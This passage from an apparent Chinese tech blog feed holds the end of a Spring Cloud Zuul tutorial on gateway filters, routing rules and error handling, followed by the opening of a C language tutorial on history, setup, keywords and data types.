class="comment">//设置响应的头文件信息以html或文本响应编码格式为utf-8</span></span><br><span class="line">            requestContext.addZuulResponseHeader(<span class="string">&quot;content-type&quot;</span>,<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">            <span class="comment">//设置响应的内容</span></span><br><span class="line">            requestContext.setResponseBody(<span class="string">&quot;非法访问&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;用户携带了身份令牌需要验证这个身份是否真的合法&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（1）filterType方法的返回值为过滤器的类型，过滤器的类型决定了过滤器在哪个生命周期执行，pre表示在路由之前执行过滤器，其他值还有post、error、route和static，当然也可以自定义。</p>
<p>（2）filterOrder方法表示过滤器的执行顺序，当过滤器很多时，我们可以通过该方法的返回值来指定过滤器的执行顺序。</p>
<p>（3）shouldFilter方法用来判断过滤器是否执行，true表示执行，false表示不执行。</p>
<p>（4）run方法则表示过滤的具体逻辑，如果请求地址中携带了token参数的话，则认为是合法请求，否则为非法请求，如果是非法请求的话，首先设置ctx.setSendZuulResponse(false); 表示不对该请求进行路由，然后设置响应码和响应值。这个run方法的返回值目前暂时没有任何意义，可以返回任意值。</p>
<p>2、通过<a href="http://localhost:8083/api-zuul/test?token=123456%E5%9C%B0%E5%9D%80%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BF%87%E6%BB%A4%E3%80%82">http://localhost:8083/api-zuul/test?token=123456地址访问，就会被过滤器过滤。</a></p>
<h2 id="8-4-Zuul的路由规则"><a href="#8-4-Zuul的路由规则" class="headerlink" title="8.4 Zuul的路由规则"></a>8.4 Zuul的路由规则</h2><p>(1) 在前面的例子中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#配置路由规则</span><br><span class="line">zuul.routes.api-zuul.path=/api-zuul<span class="comment">/**</span></span><br><span class="line"><span class="comment">zuul.routes.api-zuul.serviceId=08-springcloud-eureka-client-zuul-consumer</span></span><br><span class="line"><span class="comment">当访问地址符合/api-zuul/**规则的时候，会被自动定位到08-springcloud-eureka-client-zuul-consumer服务上，不过两行代码有点麻烦，还可以简化为：</span></span><br><span class="line"><span class="comment">zuul.routes.08-springcloud-eureka-client-zuul-consumer =/api-zuul/**</span></span><br></pre></td></tr></table></figure>

<p>zuul.routes后面跟着的是服务名，服务名后面跟着的是路径规则，这种配置方式更简单。</p>
<p>(2) 如果我们需要不给某个接口添加映射，比如说我不想给&#x2F;hello接口路由，那我们可以按如下方式配置：<br>#忽略掉某一些接口路径<br>zuul.ignored-patterns&#x3D;&#x2F;<strong>&#x2F;hello&#x2F;</strong><br>此外，我们也可以统一的为路由规则增加前缀，设置方式如下：<br>#配置网关路由的前缀<br>zuul.prefix&#x3D;&#x2F;myapi<br>此时我们的访问路径就变成了<a href="http://localhost:8080/myapi/api-zuul/test">http://localhost:8080/myapi/api-zuul/test</a><br>(3) 路由规则通配符的含义：</p>
<table>
<thead>
<tr>
<th>通配符</th>
<th>含义</th>
<th>举例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>？</td>
<td>匹配任意单个字符</td>
<td>&#x2F;05-springcloud-service-feign&#x2F;?</td>
<td>匹配  &#x2F;05-springcloud-service-feign&#x2F;a,  &#x2F;05-springcloud-service-feign&#x2F;b,  &#x2F;05-springcloud-service-feign&#x2F;c等</td>
</tr>
<tr>
<td>*</td>
<td>匹配任意数量的字符</td>
<td>&#x2F;05-springcloud-service-feign&#x2F;*</td>
<td>匹配  &#x2F;05-springcloud-service-feign&#x2F;aaa,  &#x2F;05-springcloud-service-feign&#x2F;bbb,  &#x2F;05-springcloud-service-feign&#x2F;ccc等，  无法匹配  &#x2F;05-springcloud-service-feign&#x2F;a&#x2F;b&#x2F;c</td>
</tr>
<tr>
<td>**</td>
<td>匹配任意数量的字符</td>
<td>&#x2F;05-springcloud-service-feign&#x2F;**</td>
<td>匹配  &#x2F;05-springcloud-service-feign&#x2F;aaa,  &#x2F;05-springcloud-service-feign&#x2F;bbb,  &#x2F;05-springcloud-service-feign&#x2F;ccc等，  也可以匹配  &#x2F;05-springcloud-service-feign&#x2F;a&#x2F;b&#x2F;c</td>
</tr>
</tbody></table>
<p>(4) 一般情况下API网关只是作为各个微服务的统一入口，但是有时候我们可能也需要在API网关服务上做一些特殊的业务逻辑处理，那么我们可以让请求到达API网关后，再转发给自己本身，由API网关自己来处理，那么我们可以进行如下的操作：</p>
<p>在08-springcloud-eureka-client-zuul项目中新建如下Controller：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GateWayController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/api/local&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;exec the api gateway.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在application.properties文件中配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">zuul.routes.gateway.path=/gateway<span class="comment">/**</span></span><br><span class="line"><span class="comment">zuul.routes.gateway.url=forward:/api/local</span></span><br></pre></td></tr></table></figure>

<h2 id="8-5-Zuul的异常处理"><a href="#8-5-Zuul的异常处理" class="headerlink" title="8.5 Zuul的异常处理"></a>8.5 Zuul的异常处理</h2><p>Spring Cloud Zuul对异常的处理是非常方便的，但是由于Spring Cloud处于迅速发展中，各个版本之间有所差异，本案例是以Hoxton.RC2版本为例，来说明Spring Cloud Zuul中的异常处理问题。</p>
<p>首先我们来看一张官方给出的Zuul请求的生命周期图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134883.png" alt="image-20201216225425763"></p>
<ol>
<li><p>正常情况下所有的请求都是按照pre、route、post的顺序来执行，然后由post返回response</p>
</li>
<li><p>在pre阶段，如果有自定义的过滤器则执行自定义的过滤器</p>
</li>
<li><p>pre、routing、post的任意一个阶段如果抛异常了，则执行error过滤器</p>
</li>
</ol>
<p>我们可以有两种方式统一处理异常：</p>
<ol>
<li>禁用zuul默认的异常处理SendErrorFilter过滤器，然后自定义我们自己的Errorfilter过滤器</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">zuul.SendErrorFilter.error.disable=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorFilter</span> <span class="keyword">extends</span> <span class="title class_">ZuulFilter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(ErrorFilter.class);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">filterType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">filterOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> ZuulException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RequestContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContext.getCurrentContext();</span><br><span class="line">            <span class="type">ZuulException</span> <span class="variable">exception</span> <span class="operator">=</span> (ZuulException)context.getThrowable();</span><br><span class="line">            logger.error(<span class="string">&quot;进入系统异常拦截&quot;</span>, exception);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> context.getResponse();</span><br><span class="line">            response.setContentType(<span class="string">&quot;application/json; charset=utf8&quot;</span>);</span><br><span class="line">            response.setStatus(exception.nStatusCode);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writer = response.getWriter();</span><br><span class="line">                writer.print(<span class="string">&quot;&#123;code:&quot;</span>+ exception.nStatusCode +<span class="string">&quot;,message:\&quot;&quot;</span>+ exception.getMessage() +<span class="string">&quot;\&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(writer!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            ReflectionUtils.rethrowRuntimeException(var5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>自定义全局error错误页面</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorHandlerController</span> <span class="keyword">implements</span> <span class="title class_">ErrorController</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 出异常后进入该方法，交由下面的方法处理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getErrorPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/error&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">error</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">RequestContext</span> <span class="variable">ctx</span> <span class="operator">=</span> RequestContext.getCurrentContext();</span><br><span class="line">        <span class="type">ZuulException</span> <span class="variable">exception</span> <span class="operator">=</span> (ZuulException)ctx.getThrowable();</span><br><span class="line">        <span class="keyword">return</span> exception.nStatusCode + <span class="string">&quot;--&quot;</span> + exception.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">注意：全局error错误页面与自定义异常的过滤器有冲突二选一即可</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言</title>
    <url>/2021/12/21/C%E3%80%81C++/C%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="C简介"><a href="#C简介" class="headerlink" title="C简介"></a>C简介</h1><p>C 语言是一种通用的高级语言，最初是由丹尼斯·里奇在贝尔实验室为开发 UNIX 操作系统而设计的。C 语言最开始是于 1972 年在 DEC PDP-11 计算机上被首次实现。</p>
<p>在 1978 年，布莱恩·柯林汉（Brian Kernighan）和丹尼斯·里奇（Dennis Ritchie）制作了 C 的第一个公开可用的描述，现在被称为 K&amp;R 标准。</p>
<p>UNIX 操作系统，C编译器，和几乎所有的 UNIX 应用程序都是用 C 语言编写的。由于各种原因，C 语言现在已经成为一种广泛使用的专业语言。</p>
<ul>
<li>易于学习。</li>
<li>结构化语言。</li>
<li>它产生高效率的程序。</li>
<li>它可以处理底层的活动。</li>
<li>它可以在多种计算机平台上编译。</li>
</ul>
<h2 id="关于C"><a href="#关于C" class="headerlink" title="关于C"></a>关于C</h2><ul>
<li>C 语言是为了编写 UNIX 操作系统而被发明的。</li>
<li>C 语言是以 B 语言为基础的，B 语言大概是在 1970 年被引进的。</li>
<li>C 语言标准是于 1988 年由美国国家标准协会（ANSI，全称 American National Standard Institute）制定的。</li>
<li>截至 1973 年，UNIX 操作系统完全使用 C 语言编写。</li>
<li>目前，C 语言是最广泛使用的系统程序设计语言。</li>
<li>大多数先进的软件都是使用 C 语言实现的。</li>
<li>当今最流行的 Linux 操作系统和 RDBMS（Relational Database Management System：关系数据库管理系统） MySQL 都是使用 C 语言编写的。</li>
</ul>
<h2 id="为什么要使用C"><a href="#为什么要使用C" class="headerlink" title="为什么要使用C?"></a>为什么要使用C?</h2><p>C 语言最初是用于系统开发工作，特别是组成操作系统的程序。由于 C 语言所产生的代码运行速度与汇编语言编写的代码运行速度几乎一样，所以采用 C 语言作为系统开发语言。下面列举几个使用 C 的实例：</p>
<ul>
<li>操作系统</li>
<li>语言编译器</li>
<li>汇编器</li>
<li>文本编辑器</li>
<li>打印机</li>
<li>网络驱动器</li>
<li>现代程序</li>
<li>数据库</li>
<li>语言解释器</li>
<li>实体工具</li>
</ul>
<h2 id="C11"><a href="#C11" class="headerlink" title="C11"></a>C11</h2><p>C11（也被称为C1X）指ISO标准ISO&#x2F;IEC 9899:2011，是当前最新的C语言标准。在它之前的C语言标准为C99。</p>
<p>新特性</p>
<ul>
<li>对齐处理（Alignment）的标准化（包括_Alignas标志符，alignof运算符，aligned_alloc函数以及&lt;stdalign.h&gt;头文件）。</li>
<li>_Noreturn 函数标记，类似于 gcc 的 <strong>attribute</strong>((noreturn))。</li>
<li>_Generic 关键字。</li>
<li>多线程（Multithreading）支持，包括：<br>_Thread_local存储类型标识符，&lt;threads.h&gt;头文件，里面包含了线程的创建和管理函数。<br>_Atomic类型修饰符和&lt;stdatomic.h&gt;头文件。</li>
<li>增强的Unicode的支持。基于C Unicode技术报告ISO&#x2F;IEC TR 19769:2004，增强了对Unicode的支持。包括为UTF-16&#x2F;UTF-32编码增加了char16_t和char32_t数据类型，提供了包含unicode字符串转换函数的头文件&lt;uchar.h&gt;。</li>
<li>删除了 gets() 函数，使用一个新的更安全的函数gets_s()替代。</li>
<li>增加了边界检查函数接口，定义了新的安全的函数，例如 fopen_s()，strcat_s() 等等。</li>
<li>增加了更多浮点处理宏(宏)。</li>
<li>匿名结构体&#x2F;联合体支持。这个在gcc早已存在，C11将其引入标准。</li>
<li>静态断言（Static assertions），_Static_assert()，在解释 #if 和 #error 之后被处理。</li>
<li>新的 fopen() 模式，(“…x”)。类似 POSIX 中的 O_CREAT|O_EXCL，在文件锁中比较常用。</li>
<li>新增 quick_exit() 函数作为第三种终止程序的方式。当 exit()失败时可以做最少的清理工作。</li>
</ul>
<h1 id="C环境设置"><a href="#C环境设置" class="headerlink" title="C环境设置"></a>C环境设置</h1><h2 id="UNIX-x2F-Linux-上的安装"><a href="#UNIX-x2F-Linux-上的安装" class="headerlink" title="UNIX&#x2F;Linux 上的安装"></a>UNIX&#x2F;Linux 上的安装</h2><p>如果您使用的是 <strong>Linux 或 UNIX</strong>，请在命令行使用下面的命令来检查您的系统上是否安装了 GCC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc -v</span><br></pre></td></tr></table></figure>

<p>如果您的计算机上已经安装了 GNU 编译器，则会显示如下消息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using built-in specs.</span><br><span class="line">Target: i386-redhat-linux</span><br><span class="line">Configured with: ../configure --prefix=/usr .......</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 4.1.2 20080704 (Red Hat 4.1.2-46)</span><br></pre></td></tr></table></figure>

<p>如果未安装 GCC，那么请按照 <a href="http://gcc.gnu.org/install/">http://gcc.gnu.org/install/</a> 上的详细说明安装 GCC。</p>
<p>本教程是基于 Linux 编写的，所有给定的实例都已在 Cent OS Linux 系统上编译过。</p>
<h2 id="Mac-OS-上的安装"><a href="#Mac-OS-上的安装" class="headerlink" title="Mac OS 上的安装"></a>Mac OS 上的安装</h2><p>如果您使用的是 Mac OS X，最快捷的获取 GCC 的方法是从苹果的网站上下载 Xcode 开发环境，并按照安装说明进行安装。一旦安装上 Xcode，您就能使用 GNU 编译器。</p>
<p>Xcode 目前可从 <a href="http://developer.apple.com/technologies/tools/">developer.apple.com&#x2F;technologies&#x2F;tools&#x2F;</a> 上下载。</p>
<h2 id="Windows-上的安装"><a href="#Windows-上的安装" class="headerlink" title="Windows 上的安装"></a>Windows 上的安装</h2><p>最常用的免费可用的编译器是 GNU 的 C&#x2F;C++ 编译器</p>
<p>为了在 Windows 上安装 GCC，您需要安装 MinGW(“Minimalist GNU for Windows”,)。为了安装 MinGW，请访问 MinGW 的主页 <a href="http://www.mingw.org/">www.mingw.org</a>，进入 MinGW 下载页面，下载最新版本的 MinGW 安装程序，命名格式为 MinGW-<version>.exe。</p>
<p>当安装 MinGW 时，您至少要安装 gcc-core、gcc-g++、binutils 和 MinGW runtime，但是一般情况下都会安装更多其他的项。</p>
<p>添加您安装的 MinGW 的 bin 子目录到您的 <strong>PATH</strong> 环境变量中，这样您就可以在命令行中通过简单的名称来指定这些工具。</p>
<p>当完成安装时，您可以从 Windows 命令行上运行 gcc、g++、ar、ranlib、dlltool 和其他一些 GNU 工具。</p>
<h1 id="C基本结构和语法"><a href="#C基本结构和语法" class="headerlink" title="C基本结构和语法"></a>C基本结构和语法</h1><h2 id="多文件编译"><a href="#多文件编译" class="headerlink" title="多文件编译"></a>多文件编译</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ gcc test1.c test2.c -o main.out</span><br><span class="line">$ ./main.out</span><br></pre></td></tr></table></figure>

<h2 id="C的令牌-Token"><a href="#C的令牌-Token" class="headerlink" title="C的令牌(Token)"></a>C的令牌(Token)</h2><p>C 程序由各种令牌组成，令牌可以是关键字、标识符、常量、字符串值，或者是一个符号。例如，下面的 C 语句包括五个令牌：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, World! \n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这五个令牌分别是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span></span><br><span class="line">(</span><br><span class="line"><span class="string">&quot;Hello, World! \n&quot;</span></span><br><span class="line">)</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>C 标识符是用来标识变量、函数，或任何其他用户自定义项目的名称。一个标识符以字母 A-Z 或 a-z 或下划线 _ 开始，后跟零个或多个字母、下划线和数字（0-9）。</p>
<p>C 标识符内不允许出现标点字符，比如 @、$ 和 %。C 是<strong>区分大小写</strong>的编程语言。因此，在 C 中，<em>Manpower</em> 和 <em>manpower</em> 是两个不同的标识符。下面列出几个有效的标识符：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mohd       zara    abc   move_name  a_123</span><br><span class="line">myname50   _temp   j     a23b9      retVal</span><br></pre></td></tr></table></figure>

<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>下表列出了 C 中的保留字。这些保留字不能作为常量名、变量名或其他标识符名称。</p>
<table>
<thead>
<tr>
<th align="left">关键字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">auto</td>
<td align="left">声明自动变量</td>
</tr>
<tr>
<td align="left">break</td>
<td align="left">跳出当前循环</td>
</tr>
<tr>
<td align="left">case</td>
<td align="left">开关语句分支</td>
</tr>
<tr>
<td align="left">char</td>
<td align="left">声明字符型变量或函数返回值类型</td>
</tr>
<tr>
<td align="left">const</td>
<td align="left">定义常量，如果一个变量被 const 修饰，那么它的值就不能再被改变</td>
</tr>
<tr>
<td align="left">continue</td>
<td align="left">结束当前循环，开始下一轮循环</td>
</tr>
<tr>
<td align="left">default</td>
<td align="left">开关语句中的”其它”分支</td>
</tr>
<tr>
<td align="left">do</td>
<td align="left">循环语句的循环体</td>
</tr>
<tr>
<td align="left">double</td>
<td align="left">声明双精度浮点型变量或函数返回值类型</td>
</tr>
<tr>
<td align="left">else</td>
<td align="left">条件语句否定分支（与 if 连用）</td>
</tr>
<tr>
<td align="left">enum</td>
<td align="left">声明枚举类型</td>
</tr>
<tr>
<td align="left">extern</td>
<td align="left">声明变量或函数是在其它文件或本文件的其他位置定义</td>
</tr>
<tr>
<td align="left">float</td>
<td align="left">声明浮点型变量或函数返回值类型</td>
</tr>
<tr>
<td align="left">for</td>
<td align="left">一种循环语句</td>
</tr>
<tr>
<td align="left">goto</td>
<td align="left">无条件跳转语句</td>
</tr>
<tr>
<td align="left">if</td>
<td align="left">条件语句</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">声明整型变量或函数</td>
</tr>
<tr>
<td align="left">long</td>
<td align="left">声明长整型变量或函数返回值类型</td>
</tr>
<tr>
<td align="left">register</td>
<td align="left">声明寄存器变量</td>
</tr>
<tr>
<td align="left">return</td>
<td align="left">子程序返回语句（可以带参数，也可不带参数）</td>
</tr>
<tr>
<td align="left">short</td>
<td align="left">声明短整型变量或函数</td>
</tr>
<tr>
<td align="left">signed</td>
<td align="left">声明有符号类型变量或函数</td>
</tr>
<tr>
<td align="left">sizeof</td>
<td align="left">计算数据类型或变量长度（即所占字节数）</td>
</tr>
<tr>
<td align="left">static</td>
<td align="left">声明静态变量</td>
</tr>
<tr>
<td align="left">struct</td>
<td align="left">声明结构体类型</td>
</tr>
<tr>
<td align="left">switch</td>
<td align="left">用于开关语句</td>
</tr>
<tr>
<td align="left">typedef</td>
<td align="left">用以给数据类型取别名</td>
</tr>
<tr>
<td align="left">unsigned</td>
<td align="left">声明无符号类型变量或函数</td>
</tr>
<tr>
<td align="left">union</td>
<td align="left">声明共用体类型</td>
</tr>
<tr>
<td align="left">void</td>
<td align="left">声明函数无返回值或无参数，声明无类型指针</td>
</tr>
<tr>
<td align="left">volatile</td>
<td align="left">说明变量在程序执行中可被隐含地改变</td>
</tr>
<tr>
<td align="left">while</td>
<td align="left">循环语句的循环条件</td>
</tr>
</tbody></table>
<h2 id="C99新增关键字"><a href="#C99新增关键字" class="headerlink" title="C99新增关键字"></a>C99新增关键字</h2><table>
<thead>
<tr>
<th><code>_Bool</code></th>
<th><code>_Complex</code></th>
<th><code>_Imaginary</code></th>
<th><code>inline</code></th>
<th><code>restrict</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="C11新增关键字"><a href="#C11新增关键字" class="headerlink" title="C11新增关键字"></a>C11新增关键字</h2><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>_Alignas</code></td>
<td><code>_Alignof</code></td>
<td><code>_Atomic</code></td>
<td><code>_Generic</code></td>
<td><code>_Noreturn</code></td>
</tr>
<tr>
<td><code>_Static_assert</code></td>
<td><code>_Thread_local</code></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="C数据类型"><a href="#C数据类型" class="headerlink" title="C数据类型"></a>C数据类型</h1><p>C 中的类型可分为以下几种：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">类型与描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>基本类型：</strong> 它们是算术类型，包括两种类型：整数类型和浮点类型。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>枚举类型：</strong> 它们也是算术类型，被用来定义在程序中只能赋予其一定的离散整数值的变量。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>void 类型：</strong> 类型说明符 <em>void</em> 表明没有可用的值。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>派生类型：</strong> 它们包括：指针类型、数组类型、结构类型、共用体类型和函数类型。</td>
</tr>
</tbody></table>
<h2 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h2><p>下表列出了关于标准整数类型的存储大小和值范围的细节：</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">存储大小</th>
<th align="left">值范围</th>
</tr>
</thead>
<tbody><tr>
<td align="left">char</td>
<td align="left">1 字节</td>
<td align="left">-128 到 127 或 0 到 255</td>
</tr>
<tr>
<td align="left">unsigned char</td>
<td align="left">1 字节</td>
<td align="left">0 到 255</td>
</tr>
<tr>
<td align="left">signed char</td>
<td align="left">1 字节</td>
<td align="left">-128 到 127</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">2 或 4 字节</td>
<td align="left">-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647</td>
</tr>
<tr>
<td align="left">unsigned int</td>
<td align="left">2 或 4 字节</td>
<td align="left">0 到 65,535 或 0 到 4,294,967,295</td>
</tr>
<tr>
<td align="left">short</td>
<td align="left">2 字节</td>
<td align="left">-32,768 到 32,767</td>
</tr>
<tr>
<td align="left">unsigned short</td>
<td align="left">2 字节</td>
<td align="left">0 到 65,535</td>
</tr>
<tr>
<td align="left">long</td>
<td align="left">4 字节</td>
<td align="left">-2,147,483,648 到 2,147,483,647</td>
</tr>
<tr>
<td align="left">unsigned long</td>
<td align="left">4 字节</td>
<td align="left">0 到 4,294,967,295</td>
</tr>
</tbody></table>
<h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><p>下表列出了关于标准浮点类型的存储大小、值范围和精度的细节：</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">存储大小</th>
<th align="left">值范围</th>
<th align="left">精度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">float</td>
<td align="left">4 字节</td>
<td align="left">1.2E-38 到 3.4E+38</td>
<td align="left">6 位小数</td>
</tr>
<tr>
<td align="left">double</td>
<td align="left">8 字节</td>
<td align="left">2.3E-308 到 1.7E+308</td>
<td align="left">15 位小数</td>
</tr>
<tr>
<td align="left">long double</td>
<td align="left">16 字节</td>
<td align="left">3.4E-4932 到 1.1E+4932</td>
<td align="left">19 位小数</td>
</tr>
</tbody></table>
<h2 id="void类型"><a href="#void类型" class="headerlink" title="void类型"></a>void类型</h2><p>void 类型指定没有可用的值。它通常用于以下三种情况下：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">类型与描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>函数返回为空</strong> C 中有各种函数都不返回值，或者您可以说它们返回空。不返回值的函数的返回类型为空。例如 <strong>void exit (int status);</strong></td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>函数参数为空</strong> C 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 <strong>int rand(void);</strong></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>指针指向 void</strong> 类型为 void * 的指针代表对象的地址，而不是类型。例如，内存分配函数 <strong>void *malloc( size_t size );</strong> 返回指向 void 的指针，可以转换为任何数据类型。</td>
</tr>
</tbody></table>
<h1 id="C变量"><a href="#C变量" class="headerlink" title="C变量"></a>C变量</h1><h2 id="C中的变量声明"><a href="#C中的变量声明" class="headerlink" title="C中的变量声明"></a>C中的变量声明</h2><p>变量声明向编译器保证变量以指定的类型和名称存在，这样编译器在不需要知道变量完整细节的情况下也能继续进一步的编译。变量声明只在编译时有它的意义，在程序连接时编译器需要实际的变量声明。</p>
<p>变量的声明有两种情况：</p>
<ul>
<li>1、一种是需要建立存储空间的。例如：int a 在声明的时候就已经建立了存储空间。</li>
<li>2、另一种是不需要建立存储空间的，通过使用extern关键字声明变量名而不定义它。 例如：extern int a 其中变量 a 可以在别的文件中定义的。</li>
<li>除非有extern关键字，否则都是变量的定义。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> i; <span class="comment">//声明，不是定义</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">//声明，也是定义</span></span><br></pre></td></tr></table></figure>

<h2 id="C中的左值-Lvalues-和右值-Rvalues"><a href="#C中的左值-Lvalues-和右值-Rvalues" class="headerlink" title="C中的左值(Lvalues)和右值(Rvalues)"></a>C中的左值(Lvalues)和右值(Rvalues)</h2><p>C 中有两种类型的表达式：</p>
<ol>
<li><strong>左值（lvalue）：</strong>指向内存位置的表达式被称为左值（lvalue）表达式。左值可以出现在赋值号的左边或右边。</li>
<li><strong>右值（rvalue）：</strong>术语右值（rvalue）指的是存储在内存中某些地址的数值。右值是不能对其进行赋值的表达式，也就是说，右值可以出现在赋值号的右边，但不能出现在赋值号的左边。</li>
</ol>
<h1 id="C常量"><a href="#C常量" class="headerlink" title="C常量"></a>C常量</h1><h2 id="定义常量"><a href="#定义常量" class="headerlink" title="定义常量"></a>定义常量</h2><p>在 C 中，有两种简单的定义常量的方式：</p>
<ol>
<li>使用 <strong>#define</strong> 预处理器。</li>
<li>使用 <strong>const</strong> 关键字。</li>
</ol>
